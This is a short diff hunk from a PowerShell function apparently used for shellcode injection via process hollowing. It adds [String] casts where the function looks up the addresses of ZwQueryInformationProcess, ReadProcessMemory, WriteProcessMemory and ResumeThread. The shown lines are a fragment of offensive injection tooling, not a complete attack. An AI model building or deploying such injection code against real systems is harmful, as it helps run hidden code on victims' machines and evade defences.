@@ -154,10 +154,10 @@ function Invoke-ShellcodeViaProcessHollow
     $Kernel32Handle                     = $GetModuleHandle.Invoke($null, @([String] "kernel32.dll"))
     $NtdllHandle                        = $GetModuleHandle.Invoke($null, @([String] "ntdll.dll"))
 
-    $ZwQueryInformationProcessAddress   = $GetProcAddress.Invoke($null, @($NtdllHandle,    "ZwQueryInformationProcess"))
-    $ReadProcessMemoryAddress           = $GetProcAddress.Invoke($null, @($Kernel32Handle, "ReadProcessMemory"))
-    $WriteProcessMemoryAddress          = $GetProcAddress.Invoke($null, @($Kernel32Handle, "WriteProcessMemory"))
-    $ResumeThreadAddress                = $GetProcAddress.Invoke($null, @($Kernel32Handle, "ResumeThread"))
+    $ZwQueryInformationProcessAddress   = $GetProcAddress.Invoke($null, @($NtdllHandle,    [String] "ZwQueryInformationProcess"))
+    $ReadProcessMemoryAddress           = $GetProcAddress.Invoke($null, @($Kernel32Handle, [String] "ReadProcessMemory"))
+    $WriteProcessMemoryAddress          = $GetProcAddress.Invoke($null, @($Kernel32Handle, [String] "WriteProcessMemory"))
+    $ResumeThreadAddress                = $GetProcAddress.Invoke($null, @($Kernel32Handle, [String] "ResumeThread"))
 
     # Create delegates with our function pointers.
 
